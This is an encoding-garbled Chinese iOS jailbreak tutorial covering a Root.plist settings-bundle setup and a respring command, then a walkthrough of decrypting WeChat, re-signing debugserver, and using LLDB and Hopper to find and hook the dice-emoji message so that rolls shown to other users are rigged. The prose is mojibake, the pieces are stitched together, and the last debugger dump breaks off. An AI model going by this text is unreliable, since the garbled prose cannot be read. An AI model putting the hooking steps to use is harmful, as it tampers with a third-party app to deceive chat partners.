Root.plist	        é‡ç‚¹ç¼–å†™çš„æ–‡ä»¶ï¼Œä¸»è¦é…ç½®æ’ä»¶ç•Œé¢çš„https://iphonedevwiki.net/index.php/Preferences_specifier_plist#PSSpecifier_runtime_properties_of_plist_keys
MLæ ¼å¼ï¼Œå¥½åƒè¿˜æœ‰ä¸€ç§ç±»ä¼¼JSONæ ¼å¼çš„
```
é¦–å…ˆæ¥çœ‹ entry.plistã€‚è¿™ä¸ªæ–‡ä»¶å®šä¹‰äº†æˆ‘ä»¬çš„ Preference Bundle åœ¨ã€Œè®¾ç½®ã€App ä¸­çš„å…¥å£ä¿¡æ¯ï¼Œæˆ‘ä»¬åªéœ€å…³æ³¨ label å’Œ icon å­—æ®µï¼Œå®ƒä»¬åˆ†åˆ«å†³å®šäº†å…¥å£çš„æ˜¾ç¤ºåç§°å’Œå›¾æ ‡ã€‚
xxx/Resources/Root.plist è¿™ä¸ªæ–‡ä»¶ä¸­å®šä¹‰ã€‚æ‰“å¼€è§‚å¯Ÿï¼Œæœ‰ Awesome Switch 1 çš„å­—æ ·
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>items</key>
	<array>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>cnxlsn0w First Page</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSSwitchCell</string>
			<key>default</key>
			<true/>
			<key>defaults</key>
			<string>cn.xl.sn0w</string>
			<key>key</key>
			<string>AwesomeSwitch1</string>
			<key>label</key>
			<string>Awesome Switch 1</string>
		</dict>
	</array>
	<key>title</key>
	<string>cnxlsn0w</string>
</dict>
</plist>
```
ç¼–è¾‘è¿™ä¸ª plist æ–‡ä»¶ï¼Œæ„å»ºå‡ºé€‚åˆæˆ‘ä»¬çš„è®¾ç½®ç•Œé¢UI
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>items</key>
	<array>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>Semester Setting</string>
			<key>footerText</key>
			<string>Make sure your input is in the correct format.</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSEditTextCell</string>
			<key>default</key>
			<string></string>
			<key>keyboard</key>
			<string>numbers</string>
			<!-- <key>isNumeric</key>
			<true/> -->
			<key>placeholder</key>
			<string>yyyyMMdd (eg. 20160627)</string>
			<key>defaults</key>
			<string>com.wangjinli.weekcountpb</string>
			<key>key</key>
			<string>StartDateStr</string>
			<key>label</key>
			<string>Start Date</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>Duration</string>
			<key>id</key>
			<string>SliderLabelCell</string>
			<key>footerText</key>
			<string>Total weeks in the semester.</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSSliderCell</string>
			<key>defaults</key>
			<string>com.wangjinli.weekcountpb</string>
			<key>min</key>
			<integer>1</integer>
			<key>max</key>
			<integer>30</integer>
			<key>default</key>
			<integer>18</integer>
			<key>showValue</key>
			<true/>
			<key>isSegmented</key>
			<true/>
			<key>segmentCount</key>
			<integer>29</integer>
			<key>key</key>
			<string>Duration</string>
			<key>label</key>
			<string>Duration</string>
			<key>PostNotification</key>
			<string>com.wangjinli.weekcountpb/prefsChanged</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>First Weekday</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSSegmentCell</string>
			<key>defaults</key>
			<string>com.wangjinli.weekcountpb</string>
			<key>key</key>
			<string>WeekStartDay</string>
			<key>label</key>
			<string>First Weekday</string>
			<key>validValues</key>
			<array>
				<string>Monday</string>
				<string>Sunday</string>
			</array>
			<key>validTitles</key>
			<array>
				<string>Monday</string>
				<string>Sunday</string>
			</array>
			<key>default</key>
			<string>Monday</string>
			<key>PostNotification</key>
			<string>com.wangjinli.weekcountpb/prefsChanged</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>Display Settings</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSSwitchCell</string>
			<key>defaults</key>
			<string>com.wangjinli.weekcountpb</string>
			<key>label</key>
			<string>Lock Screen</string>
			<key>key</key>
			<string>LockScreenEnabled</string>
			<key>default</key>
			<true/>
			<key>PostNotification</key>
			<string>com.wangjinli.weekcountpb/prefsChanged</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSSwitchCell</string>
			<key>defaults</key>
			<string>com.wangjinli.weekcountpb</string>
			<key>label</key>
			<string>Notification Center</string>
			<key>key</key>
			<string>NCEnabled</string>
			<key>default</key>
			<true/>
			<key>PostNotification</key>
			<string>com.wangjinli.weekcountpb/prefsChanged</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string></string>
			<key>footerText</key>
			<string>Use %W to denote where the week number should be displayed.</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSEditTextCell</string>
			<key>default</key>
			<string></string>
			<!-- <key>keyboard</key>
			<string>numbers</string> -->
			<!-- <key>isNumeric</key>
			<true/> -->
			<key>placeholder</key>
			<string></string>
			<key>defaults</key>
			<string>com.wangjinli.weekcountpb</string>
			<key>key</key>
			<string>DisplayFormat</string>
			<key>label</key>
			<string>Display Format</string>
			<key>default</key>
			<string>Week %W</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>footerText</key>
			<string>Respring to apply changes.</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSButtonCell</string>
			<key>label</key>
			<string>Respring</string>
			<key>action</key>
			<string>respring</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>footerText</key>
			<string>Â© 2016  Li</string>
		</dict>
	</array>
	<key>title</key>
	<string>WeekCount</string>
</dict>
</plist>
```
iPhoneæ³¨é”€ä¸»å±å¹•
```
- (void)respring {
    system("killall -9 SpringBoard");
}
```
#### èµ„æ–™:
https://iphonedevwiki.net/index.php/Preferences_specifier_plist#PSSpecifier_runtime_properties_of_plist_keys
http://iphonedevwiki.net/index.php/Preferences_specifier_plist

### è‡ªå®šä¹‰å¾®ä¿¡éª°å­

é€šè¿‡å‘é€è¡¨æƒ…çš„ View æ‰¾åˆ°å…¶ Controllerï¼Œå†åœ¨ Controller ä¸­æ‰¾åˆ°å‘é€è¡¨æƒ…è¿™ä¸ªæ“ä½œçš„å“åº”æ–¹æ³•ã€‚
ç„¶åé€šè¿‡é€†å‘äºŒè¿›åˆ¶æ–‡ä»¶å¾—åˆ°çš„åæ±‡ç¼–æºç ï¼Œä»¥è¯¥æ–¹æ³•ä½œä¸ºå…¥å£ï¼Œé€å±‚åˆ†æè°ƒç”¨å…³ç³»ï¼Œç›´åˆ°æ‰¾åˆ°å…³é”®æ–¹æ³•ï¼Œè¿›è€Œåˆ†æè¯¥è¡¨æƒ…çš„ Model å¹¶å®Œæˆä¿®æ”¹ã€‚
å‡†å¤‡å·¥ä½œ

#### ç ¸å£³ã€å¤´æ–‡ä»¶è·å–
App Store é‡Œ App çš„äºŒè¿›åˆ¶æ–‡ä»¶è¢«è¿›è¡Œäº†åŠ å¯†ï¼Œæ— æ³•ç›´æ¥åæ±‡ç¼–åˆ†æï¼Œä¹Ÿæ— æ³•é€šè¿‡ class-dump è·å–å¤´æ–‡ä»¶ï¼Œå› æ­¤é¦–å…ˆéœ€è¦å¯¹å…¶è¿›è¡Œè§£å¯†ï¼Œé€šå¸¸ç§°ä¹‹ä¸ºã€Œç ¸å£³ã€ã€‚
~  class-dump -S -s -H ./WeChat -o ./headers/

#### debugserver ä¸ LLDB é…ç½®
LLDB æ˜¯ Xcode å†…ç½®çš„è°ƒè¯•å™¨ï¼Œdebugserver åˆ™æ˜¯è¿è¡Œåœ¨ iOS ä¸Šçš„è°ƒè¯•æœåŠ¡ç«¯ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å®ƒä»¬å¯¹å¾®ä¿¡è¿›è¡ŒåŠ¨æ€è°ƒè¯•åˆ†æã€‚
åœ¨å°†è®¾å¤‡æ·»åŠ åˆ° Xcode ä¹‹åï¼Œdebugserver ä¼šè¢«è‡ªåŠ¨å®‰è£…åˆ°è®¾å¤‡çš„ /Developer/usr/bin/ ç›®å½•ä¸‹ã€‚
ä½†ç”±äºç¼ºå°‘ task_for_pid æƒé™ï¼Œè¿™é‡Œçš„ debugserver åªèƒ½ç”¨æ¥è°ƒè¯•è‡ªå·±å¼€å‘çš„ Appï¼Œå› æ­¤éœ€è¦å¯¹å…¶è¿›è¡Œå¤„ç†ã€‚
å°† debugserver æ‹·è´åˆ° Macï¼Œé¦–å…ˆé€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯¹å…¶è¿›è¡Œã€Œç˜¦èº«ã€ã€‚å…¶ä¸­ arm64 ä¸º64ä½å¤„ç†å™¨æ¶æ„ï¼Œæ­¤å‚æ•°å› è®¾å¤‡è€Œå¼‚ï¼ˆå¦‚å¯¹äº iPhone 5 å°±åº”æ˜¯ armv7sï¼‰ã€‚
~ lipo -thin arm64 ./debugserver -output ./debugserver

ç„¶åä¸ºå…¶æ·»åŠ  task_for_pid æƒé™ï¼Œä¸‹è½½è¿™ä¸ª ent.plist æ–‡ä»¶å¯¹å…¶è¿›è¡Œç­¾åã€‚
~ codesign -s - --entitlements ent.plist -f debugserver
å®Œæˆä¸Šè¿°æ­¥éª¤åå°† debugserver æ‹·è´å›è®¾å¤‡çš„ /usr/bin/ ç›®å½•ä¸‹ï¼Œå¹¶èµ‹äºˆå¯æ‰§è¡Œæƒé™å³å¯ã€‚
LLDB æ”¯æŒ Python è„šæœ¬ï¼Œä½¿ç”¨ Python å¯ä»¥å¤§å¹…æé«˜è°ƒè¯•æ•ˆç‡ã€‚Chisel æ˜¯ Facebook å¼€æºçš„ä¸€ä¸ª LLDB Python å‘½ä»¤é›†ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å®ƒå¸®åŠ©æˆ‘ä»¬çš„è°ƒè¯•ã€‚ç”¨ Homebrew å®‰è£… Chisel å¹¶å°†å…¶æ·»åŠ è¿› LLDB çš„åˆå§‹åŒ–è„šæœ¬ä¸­ã€‚
```
~ brew install chisel
~ echo command script import /path/to/fblldb.py >> ~/.lldbinit
```

#### å®šä½å…¥å£æ–¹æ³•
ä½¿ç”¨ debugserver å¯åŠ¨å¾®ä¿¡ã€‚
iPhone:~ root# debugserver *:1234 -x backboard /path/to/WeChat.app/WeChat
ç„¶ååœ¨ Mac ä¸Šç”¨ LLDB è¿æ¥åˆ° debugserverï¼Œå¹¶è®©å¾®ä¿¡ç»§ç»­è¿è¡Œã€‚
```
~ lldb
(lldb) process connect connect://IOS_IP:1234
Process 51735 stopped
* thread #1: tid = 0xb076f, 0x000000018270d014 libsystem_kernel.dylib`semaphore_wait_trap + 8, queue = 'com.apple.main-thread', stop reason = signal SIGSTOP
    frame #0: 0x000000018270d014 libsystem_kernel.dylib`semaphore_wait_trap + 8
libsystem_kernel.dylib`semaphore_wait_trap:
->  0x18270d014 <+8>: ret

libsystem_kernel.dylib`semaphore_wait_signal_trap:
    0x18270d018 <+0>: movn   x16, #0x24
    0x18270d01c <+4>: svc    #0x80
    0x18270d020 <+8>: ret
(lldb) c
Process 51735 resuming
```

å¾…å¾®ä¿¡å¯åŠ¨å®Œæ¯•ä¹‹åï¼Œå…ˆæ‰“å¼€å¾®ä¿¡ Mac ç‰ˆï¼Œå€ŸåŠ©æ–‡ä»¶ä¼ è¾“åŠ©æ‰‹æ„å»ºä¸€ä¸ªæ”¶å‘åŒç«¯çš„æµ‹è¯•ç¯å¢ƒï¼ˆæœ‰å°å·æˆ–è€…æœ‰å¥³æœ‹å‹æ„¿æ„é…åˆæµ‹è¯•çš„ä¹Ÿå¯ï¼‰ã€‚è¿›å…¥åˆ°å‘é€éª°å­çš„ç•Œé¢ï¼Œä¸­æ–­å¾®ä¿¡ï¼Œæ‰“å°å‡ºå½“å‰çš„ UI ç»“æ„ã€‚
```
(lldb) process interrupt
(lldb) po [[UIApp keyWindow] recursiveDescription]
<iConsoleWindow: 0x13df5dd20; baseClass = UIWindow; frame = (0 0; 375 667); autoresize = W+H; gestureRecognizers = <NSArray: 0x13df4e8f0>; layer = <UIWindowLayer: 0x13dde49a0>>
   | <UILayoutContainerView: 0x13f3ba980; frame = (0 0; 375 667); autoresize = W+H; layer = <CALayer: 0x13f3ba880>>
   |    | <UITransitionView: 0x13f3bb560; frame = (0 0; 375 667); clipsToBounds = YES; autoresize = W+H; layer = <CALayer: 0x13dd02a90>>
   ...
    <EmoticonViewWithPreview: 0x13fae98a0; frame = (116 18; 56.5 56.5); layer = <CALayer: 0x13fd2f230>>
æ‰“å°å‡ºçš„ UI ç»“æ„éå¸¸å¤æ‚ï¼Œç»è¿‡ä¸€ç•ªä»”ç»†å¯»æ‰¾ï¼Œå‘ç° EmoticonViewWithPreview è¿™ä¸ª View çš„åç§°æ¯”è¾ƒå»åˆï¼Œä¸”æ•°é‡æ˜¯ 7 ä¸ªï¼Œå’Œæˆ‘åœ¨è¿™ä¸ªç•Œé¢ä¸Šçš„è¡¨æƒ…æ•°ç›¸åŒï¼Œåˆæ­¥ç¡®å®šå®ƒå°±æ˜¯è¡¨æƒ…æ˜¾ç¤ºçš„ Viewã€‚å› ä¸ºéª°å­æ˜¯ç¬¬äºŒä¸ªè¡¨æƒ…ï¼Œæ‰€ä»¥æ‰¾åˆ°ç¬¬äºŒä¸ª EmoticonViewWithPreview çš„åœ°å€ 0x13fae98a0ï¼Œå°è¯•ä½¿ç”¨ hide 0x13fae98a0 å‘½ä»¤ï¼Œæœç„¶å‘ç°è®¾å¤‡ä¸Šçš„éª°å­æ¶ˆå¤±äº†ï¼ŒçŒœæƒ³å¾—åˆ°äº†éªŒè¯ã€‚
ä¸‹é¢å®šä½å®ƒçš„ Controllerï¼Œä½¿ç”¨ presponder å‘½ä»¤æ‰“å°å…¶å“åº”é“¾ã€‚
(lldb) presponder 0x13fae98a0
<EmoticonViewWithPreview: 0x13fae98a0; frame = (202.5 18; 56.5 56.5); layer = <CALayer: 0x13fb14360>>
   | <EmoticonGridView: 0x13f8e2600; frame = (0 0; 375 187); gestureRecognizers = <NSArray: 0x13fbe45f0>; layer = <CALayer: 0x13fbc4470>>
   |    | <EmoticonBoardPageCollectionEmoticonGridCell: 0x13fd39720; baseClass = UICollectionViewCell; frame = (2250 0; 375 187); layer = <CALayer: 0x13faf4d20>>
   |    |    | <UICollectionView: 0x13e899a00; frame = (0 160; 375 187); gestureRecognizers = <NSArray: 0x13fc2cb40>; layer = <CALayer: 0x13f9f2db0>; contentOffset: {2250, 0}; contentSize: {10875, 187}> collection view layout: <UICollectionViewFlowLayout: 0x13fc29b70>
   |    |    |    | <UIView: 0x13f91c520; frame = (0 -160; 375 347); clipsToBounds = YES; layer = <CALayer: 0x13f909ea0>>
   |    |    |    |    | <EmoticonBoardView: 0x13f4c4130; frame = (0 443; 375 224); layer = <CALayer: 0x13fc035f0>>
   |    |    |    |    |    | <MMInputToolView: 0x13f5b7cf0; frame = (0 0; 375 667); text = ''; layer = <CALayer: 0x13fa6cc40>>
   |    |    |    |    |    |    | <UIView: 0x13f4981b0; frame = (0 0; 375 667); autoresize = W+H; layer = <CALayer: 0x13f90a7c0>>
   |    |    |    |    |    |    |    | <BaseMsgContentViewController: 0x13e42be00>
   |    |    |    |    |    |    |    ...
å¯ä»¥çœ‹åˆ° BaseMsgContentViewController å°±æ˜¯å®ƒçš„ Controllerï¼Œæˆ‘ä»¬æ‰“å¼€ BaseMsgContentViewController.h è§‚å¯Ÿä¸€ä¸‹ï¼Œå°è¯•å¯»æ‰¾ç‚¹å‡»éª°å­ä¹‹åçš„å“åº”æ–¹æ³•ã€‚
è¿™ä¸ªå¤´æ–‡ä»¶æœ‰å¤šè¾¾ 600 å¤šè¡Œï¼ˆä¸€ä¸ªç±»å†™æˆè¿™æ ·çœŸçš„æ²¡é—®é¢˜å—ï¼Ÿï¼‰ï¼Œä½¿ç”¨å…³é”®è¯ emoticon æœç´¢ï¼Œå®¹æ˜“å‘ç° â€” (void)SendEmoticonMesssageToolView:(id)arg1; æ–¹æ³•è¾ƒä¸ºå¯ç–‘ï¼Œæˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨ã€‚
ä½¿ç”¨ Hopper Disassembler v3 å¯¹ã€Œç ¸å£³ã€è¿‡åçš„å¾®ä¿¡äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œåæ±‡ç¼–åˆ†æï¼Œæ‰¾åˆ°è¯¥æ–¹æ³•ã€‚
-[BaseMsgContentViewController SendEmoticonMesssageToolView:]:
00000001018eb1e8    stp     x24, x23, [sp, #0xffffffc0]!
...
00000001018eb2f4    b       imp___stubs__objc_release
                            ; endp
```
ä¸‹é¢æˆ‘ä»¬åœ¨è¯¥æ–¹æ³•å…¥å£åœ°å€å¤„ä¸‹æ–­ç‚¹ã€‚é¦–å…ˆæ‰¾åˆ°å¾®ä¿¡çš„ ASLR åç§»åœ°å€ã€‚
(lldb) im li -o
[  0] 0x000000000005c000
[  1] 0x000000010388c000
...
ASLR åç§»ä¸º 0x5c000ï¼Œæ–¹æ³•å…¥å£åœ°å€ä¸º 0x1018eb1e8ï¼Œå› æ­¤è¯¥å‘½ä»¤åœ¨å†…å­˜ä¸­çš„åœ°å€åº”ä¸º 0x5c000+0x1018eb1e8=0x1019471e8ï¼Œæˆ‘ä»¬åœ¨è¯¥å¤„ä¸‹æ–­ç‚¹ã€‚
(lldb) br s -a 0x5c000+0x1018eb1e8
Breakpoint 1: where = WeChat`___lldb_unnamed_function82507$$WeChat, address = 0x00000001019471e8
æŒ‰ç…§åŒæ ·çš„æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•æœ€åä¸€æ¡è¯­å¥å¤„ä¹Ÿä¸‹æ–­ç‚¹ã€‚ç„¶åè®©å¾®ä¿¡æ¢å¤è¿è¡Œï¼Œç‚¹å‡»éª°å­ï¼Œå…¥å£çš„æ–­ç‚¹æœç„¶è¢«è§¦å‘äº†ã€‚
```
Process 51735 stopped
* thread #1: tid = 0xb076f, 0x00000001019471e8 WeChat`___lldb_unnamed_function82507$$WeChat, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x00000001019471e8 WeChat`___lldb_unnamed_function82507$$WeChat
WeChat`___lldb_unnamed_function82507$$WeChat:
->  0x1019471e8 <+0>:  stp    x24, x23, [sp, #-64]!
    0x1019471ec <+4>:  stp    x22, x21, [sp, #16]
    0x1019471f0 <+8>:  stp    x20, x19, [sp, #32]
    0x1019471f4 <+12>: stp    x29, x30, [sp, #48]
(lldb)
```
è¿™æ—¶æ”¶å‘åŒæ–¹å‡æœªå‡ºç°éª°å­ã€‚è¾“å…¥ c è®©å¾®ä¿¡ç»§ç»­è¿è¡Œï¼Œæ–­ç‚¹ 2 éšå³è¢«è§¦å‘ã€‚è¾“å…¥ ni è·³å‡ºæ–¹æ³•ï¼Œè¿™æ—¶å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œæ¥æ”¶æ–¹å·²ç»æ”¶åˆ°äº†éª°å­ï¼Œè€Œæœ¬æœºå°šæœªå‡ºç°ã€‚è¿™è¯´æ˜äº§ç”Ÿéª°å­ç‚¹æ•°çš„å…³é”®å°±åœ¨è¿™ä¸ªæ–¹æ³•å†…éƒ¨ï¼Œéšååªä¼šè¿›è¡Œä¸€äº›æœ¬åœ° UI çš„æ›´æ–°ã€‚æˆ‘ä»¬æˆåŠŸæ‰¾åˆ°äº†å…¥å£æ–¹æ³•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯é¡ºç€è°ƒç”¨é“¾ç»§ç»­æ‘¸ç´¢ä¸‹å»ã€‚
æ¢ç´¢è°ƒç”¨é“¾

åœ¨å…¥å£æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬å°†ç€é‡å…³æ³¨å½¢å¦‚ 00000001018eb23c bl imp___stubs__objc_msgSend æ–¹æ³•è°ƒç”¨è¯­å¥ã€‚è¿™æ˜¯å› ä¸º Objective-C ä¸­ï¼Œ[SomeObject someMethod] çš„åº•å±‚å®ç°æ˜¯ objc_msgSend(SomeObject, someMethod)ï¼Œå› æ­¤åœ¨è¿™äº›è¯­å¥å¤„ä¸‹æ–­ç‚¹ï¼Œå¹¶æ‰“å°å‡ºå‚æ•°ï¼Œå°±å¯ä»¥å¾—çŸ¥è°ƒç”¨çš„æ˜¯å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•ï¼Œä»è€Œé€å±‚è¿›è¡Œå¯»æ‰¾ã€‚
ç®€å•ç²—æš´åœ°åœ¨æ¯ä¸€ä¸ª objc_msgSend å¤„ä¸‹æ–­ç‚¹ï¼Œè§‚å¯Ÿæ‰§è¡Œå®Œå“ªä¸€å¥ä¹‹åï¼Œæ¥æ”¶æ–¹æ”¶åˆ°äº†éª°å­å³å¯ã€‚äºæ˜¯é¡ºåˆ©åœ°å®šä½åˆ°äº† 0x018eb2cc å¤„çš„è¯­å¥ï¼Œåœ¨è¯¥è¯­å¥å¤„æŸ¥çœ‹å‚æ•°å°±å¯ä»¥å¾—çŸ¥æ˜¯è°ƒç”¨çš„æ˜¯å“ªä¸ªæ–¹æ³•äº†ã€‚åœ¨ 64 ä½ç³»ç»Ÿä¸­ï¼Œå‡½æ•°çš„å‚æ•°å­˜æ”¾åœ¨ X0~XN å¯„å­˜å™¨ä¸­ï¼Œæ‰€ä»¥ X0 åº”æ˜¯ç±»/å®ä¾‹ï¼Œè€Œ X1 åº”æ˜¯æ–¹æ³•åï¼Œå®ƒå¯ä»¥è¢«å¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚
```
(lldb) po [$x0 class]
WeixinContentLogicController

(lldb) p (char *)$x1
(char *) $115 = 0x00000001026c34ce "SendEmoticonMessage:"
```
å¯è§æ­¤å¤„è°ƒç”¨çš„æ˜¯ [WeixinContentLogicController SendEmoticonMessage:] æ–¹æ³•ã€‚ç›´æ¥åœ¨ Hopper ä¸­æœä¸åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œæ‰“å¼€ WeixinContentLogicController.h è§‚å¯Ÿï¼ŒåŸæ¥è¿™ä¸ªæ–¹æ³•å®šä¹‰åœ¨å…¶åŸºç±» BaseMsgContentLogicController ä¸­ï¼Œè¿™æ ·å°±å¯ä»¥æˆåŠŸåœ¨ Hopper ä¸­æ‰¾åˆ°å®ƒã€‚
æ¥ä¸‹æ¥å¦‚æ³•ç‚®åˆ¶ï¼Œåœ¨ [BaseMsgContentLogicController SendEmoticonMessage:] ä¸­å†æ¬¡æ‰¾åˆ°äº†ä¸€ä¸ªå…³é”®çš„ objc_msgSendï¼Œè°ƒç”¨çš„æ˜¯ [GameController sendGameMessage:toUsr:] è¿™ä¸ªæ–¹æ³•ã€‚
ç»§ç»­é¡ºè—¤æ‘¸ç“œï¼Œåœ¨ Hopper ä¸­å®šä½åˆ° [GameController sendGameMessage:toUsr:] æ–¹æ³•ï¼Œå¤§è‡´ä¸€æ‰«ï¼Œé©¬ä¸Šè§‚å¯Ÿåˆ°äº†å«Œç–‘äººçš„èº«å½±ï¼šè¿™ä¸ªæ–¹æ³•ä¸­è°ƒç”¨äº† random éšæœºæ•°å‡½æ•°ã€‚
Image for post
çœ‹æ¥éª°å­ç‚¹æ•°å°±æ˜¯åœ¨è¿™ä¹‹åäº§ç”Ÿçš„ï¼Œç»§ç»­ä»è¿™ä¸€å¥ä¹‹åè¿›è¡Œåˆ†æã€‚ä¾ç„¶é‡‡ç”¨ä¹‹å‰çš„æ–¹æ³•å±‚å±‚æ·±å…¥ï¼Œæœ€ç»ˆå¯ä»¥æ‘¸ç´¢å‡ºå¦‚ä¸‹çš„è°ƒç”¨é“¾ã€‚
Image for post
å®šä½ Model
æ•´ç†å‡ºè°ƒç”¨é“¾åï¼Œæˆ‘ä»¬ç›´æ¥åœ¨è°ƒç”¨æœ€åä¸€ä¸ªä¸Šä¼ æ–¹æ³• [CEmoticonUploadMgr StartUpload:] æ—¶ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹å®ƒçš„å‚æ•°ï¼ˆåº”åœ¨ X2 å¯„å­˜å™¨ï¼‰ã€‚
(lldb) po [$x2 class]
CMessageWrap
è‡³æ­¤æˆ‘ä»¬æˆåŠŸå®šä½äº†éª°å­è¡¨æƒ…çš„ Model â€” â€” å®ƒæ˜¯ä¸€ä¸ª CMessageWrap ç±»çš„å®ä¾‹ï¼Œæˆ‘ä»¬åœ¨å¤´æ–‡ä»¶ä¸­è¿›è¡Œæœç´¢ï¼Œå‘ç°è¿™ä¸ªç±»å…·æœ‰å¤šä¸ª categoryï¼ˆå®é™…ä¸Šè¯¥ç±»æ˜¯æ‰€æœ‰å¾®ä¿¡æ¶ˆæ¯çš„ Modelï¼Œè€ƒè™‘åˆ°å¾®ä¿¡æ–‡å­—ã€è¯­éŸ³ã€è¡¨æƒ…ç­‰å¤šç§å¤šæ ·çš„æ¶ˆæ¯ç±»å‹ï¼Œcategory æ˜¯ä¸€ä¸ªå¾ˆè‡ªç„¶çš„å®ç°æ–¹å¼ï¼‰ã€‚æˆ‘ä»¬ç›´æ¥æ‰“å¼€ CMessageWrap-Emoticon.h æŸ¥çœ‹ã€‚
Image for post
å®¹æ˜“å‘ç°å…¶ä¸­ä¸‹é¢ä¸¤è¡Œå¾ˆæœ‰å¯èƒ½ä¸æˆ‘ä»¬çš„ç›®æ ‡æœ‰å…³ã€‚
@property(nonatomic) unsigned int m_uiGameContent; // @dynamic m_uiGameContent;
@property(nonatomic) unsigned int m_uiGameType; // @dynamic m_uiGameType;

#### ä¸‹é¢æˆ‘ä»¬ç¼–å†™ Tweakï¼Œ

hook [CEmoticonUploadMgr StartUpload:] è¿™ä¸ªæ–¹æ³•ï¼Œå°†å‚æ•°çš„è¿™ä¸¤ä¸ªå±æ€§æ‰“å°å‡ºæ¥è§‚å¯Ÿã€‚è¿‡ç¨‹ç•¥è¿‡ï¼Œæœ€ç»ˆç»è¿‡å¤šæ¬¡å®éªŒï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“è®ºã€‚

m_uiGameType ä¸º 1 ä»£è¡¨å‰ªåˆ€çŸ³å¤´å¸ƒï¼Œ2 ä»£è¡¨éª°å­ï¼Œ0 åˆ™æ˜¯æ™®é€šè¡¨æƒ…ï¼›m_uiGameContent çš„å€¼ä» 1 è‡³ 9ï¼Œä¾æ¬¡ä»£è¡¨å‰ªåˆ€ã€çŸ³å¤´ã€å¸ƒä»¥åŠéª°å­çš„ 1 ~ 6 ç‚¹ã€‚
ä¿®æ”¹ç»“æœ
é¦–å…ˆå°è¯•ç›´æ¥åœ¨ [CEmoticonUploadMgr StartUpload:] ä¸­æˆªè·ä¼ å…¥çš„å‚æ•°ï¼Œæ ¹æ® m_uiGameType åˆ¤æ–­è¡¨æƒ…ç±»å‹ï¼Œç„¶åä¿®æ”¹ m_uiGameContentã€‚æ­¤æ—¶ç»“æœæ˜¯ï¼ˆæ„Ÿè°¢å°ä¼™ä¼´ä»¬é…åˆæµ‹è¯•ï¼‰ï¼šæœ¬æœºæ²¡æœ‰æ•ˆæœï¼›æ¥æ”¶æ–¹è‹¥æ˜¯ iPhone åˆ™å¯ä»¥æ˜¾ç¤ºä¿®æ”¹åçš„ç»“æœï¼Œè‹¥æ˜¯ Android è®¾å¤‡æˆ– Mac åˆ™åŒæ ·æ— æ•ˆæœï¼Œä¸”ç»“æœä¸æœ¬æœºæ˜¾ç¤ºçš„ç›¸åŒã€‚
è¿™è¯´æ˜ä¸¤ç‚¹é—®é¢˜ï¼šç¬¬ä¸€ï¼Œéšæœºæ•°äº§ç”Ÿåï¼Œåœ¨ä¹‹å‰å¾—å‡ºçš„è°ƒç”¨é“¾ä¸­ä¼ é€’ç»™äº†å…¶ä»–æ²¡æœ‰åˆ†æåˆ°çš„æ–¹æ³•ï¼Œé€ æˆæœ¬æœºä¸ç”Ÿæ•ˆï¼›ç¬¬äºŒï¼Œæœ€ç»ˆä¸Šä¼ çš„ CMessageWrap ä¸­é™¤äº† m_uiGameContent å±æ€§å¤–ï¼Œä»æœ‰å…¶ä»–å±æ€§è®°å½•äº†éª°å­çš„çœŸå®å€¼ã€‚
ä¸ºéªŒè¯ç¬¬äºŒç‚¹ï¼Œæˆ‘ä»¬æ‰“å°å‡º [CEmoticonUploadMgr StartUpload:] çš„å‚æ•°çš„æ‰€æœ‰ä¿¡æ¯è¿›è¡ŒæŸ¥çœ‹ã€‚
```
(lldb) pinternals $x2
(CMessageWrap) $129 = {
  MMObject = {
    NSObject = {
      isa = CMessageWrap
    }
  }
  m_bIsSplit = false
  m_bNew = true
  m_uiMesLocalID = 328
  m_n64MesSvrID = 0
  m_nsFromUsr = 0xa0a0d02812812039
  m_nsToUsr = 0xa0221102a012405a
  m_uiMessageType = 47
  m_nsContent = 0x000000013f489e40 @"<msg><emoji md5=\"5ba8e9694b853df10b9f2a77b312cc09\" type=\"1\" len = \"8636\" productid=\"custom_emoticon_pid\"></emoji><gameext type=\"2\" content=\"9\" ></gameext></msg>"
  m_uiStatus = 1
  ...
  
  ```
